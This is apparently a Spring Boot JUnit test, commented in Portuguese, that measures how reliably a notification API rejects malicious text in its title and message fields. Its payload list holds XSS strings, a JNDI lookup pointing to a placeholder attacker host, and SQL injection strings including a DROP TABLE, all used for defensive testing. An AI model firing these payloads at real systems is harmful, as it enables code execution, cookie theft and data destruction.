package com.justdoit.notification.qualidade;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.justdoit.common.security.JwtValidator;
import com.justdoit.notification.feature.notification.NotificationController;
import com.justdoit.notification.feature.notification.NotificationService;
import com.justdoit.notification.shared.NotificationType;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.bean.override.mockito.MockitoBean;
import org.springframework.test.web.servlet.MockMvc;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import static com.justdoit.common.security.AuthTestSupport.authenticatedUser;
import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.csrf;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;

/**
 * Atributo de Qualidade: SEGURANÇA
 * Métrica: Taxa de Eficácia de Filtragem e Validação de Entrada de Texto
 *
 *   X = A / B            (0 <= X <= 1; ideal = 1)
 *   A = nº de requisições com textos maliciosos REJEITADAS com sucesso (HTTP 400).
 *   B = nº total de requisições com textos maliciosos disparadas.
 *
 * Recorte do notification-service: os campos {@code title} e {@code message} de
 * {@code CreateNotificationRequest}, protegidos por {@code @TextoSeguro}.
 *
 * Slice de controller ({@code @WebMvcTest}) é suficiente aqui: a Bean Validation
 * roda antes de qualquer chamada ao service, então a rejeição é observável sem
 * subir banco.
 */
@WebMvcTest(NotificationController.class)
class ValidacaoEntradaMetricsTest {

    @Autowired private MockMvc mockMvc;
    @Autowired private ObjectMapper objectMapper;
    @MockitoBean private NotificationService notificationService;
    @MockitoBean private JwtValidator jwtValidator;

    private static final UUID USER_ID = UUID.fromString("00000000-0000-0000-0000-000000000001");

    private static final List<String> PAYLOADS_MALICIOSOS = List.of(
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\"></iframe>",
            "<body onload=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(document.cookie)",
            "${jndi:ldap://evil.com/a}",
            "'; DROP TABLE task; --",
            "1' OR '1'='1",
            "admin'--",
            "UNION SELECT password FROM users"
    );

    @Test
    @DisplayName("métrica de segurança: taxa de eficácia de filtragem de entrada deve ser 1.0")
    void taxaDeEficaciaDeFiltragemDeEntrada_deveSer1() throws Exception {
        int totalDisparadas = 0;   // B
        int totalRejeitadas = 0;   // A
        List<String> falhas = new ArrayList<>();

        for (String payload : PAYLOADS_MALICIOSOS) {
            for (Map.Entry<String, Map<String, Object>> alvo : camposDeTexto(payload).entrySet()) {
                totalDisparadas++;
                int status = disparar(alvo.getValue());
                if (status == 400) {
                    totalRejeitadas++;
                } else {
                    falhas.add(String.format("%s com [%s] -> status %d", alvo.getKey(), payload, status));
                }
            }
        }

        double X = (double) totalRejeitadas / totalDisparadas;

        System.out.printf(
                "[MÉTRICA SEGURANÇA - VALIDAÇÃO DE ENTRADA] A=%d rejeitadas / B=%d maliciosas -> X = %.4f%n",
                totalRejeitadas, totalDisparadas, X);

        assertThat(falhas)
                .as("Brecha: campos que aceitaram texto malicioso em vez de rejeitar com 400")
                .isEmpty();
        assertThat(X)
                .as("Taxa de Eficácia de Filtragem e Validação de Entrada (X = A/B), ideal = 1")
                .isEqualTo(1.0);
    }

    @Test
    @DisplayName("texto legítimo continua sendo aceito (proteção não quebra o produto)")
    void textoLegitimoContinuaSendoAceito() throws Exception {
        int status = disparar(corpo("Tarefa concluída", "Você concluiu \"Revisar orçamento < 500\" às 14h"));

        assertThat(status)
                .as("Falso positivo: notificação legítima foi barrada pela proteção")
                .isNotEqualTo(400);
    }

    private Map<String, Map<String, Object>> camposDeTexto(String payload) {
        Map<String, Map<String, Object>> alvos = new LinkedHashMap<>();
        alvos.put("POST /notifications (title)", corpo(payload, "Mensagem válida"));
        alvos.put("POST /notifications (message)", corpo("Título válido", payload));
        return alvos;
    }

    private Map<String, Object> corpo(String title, String message) {
        Map<String, Object> corpo = new LinkedHashMap<>();
        corpo.put("type", NotificationType.TASK_COMPLETED.name());
        corpo.put("title", title);
        corpo.put("message", message);
        return corpo;
    }

    private int disparar(Map<String, Object> corpo) throws Exception {
        return mockMvc.perform(post("/notifications")
                        .with(csrf())
                        .with(authenticatedUser(USER_ID))
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(corpo)))
                .andReturn().getResponse().getStatus();
    }
}
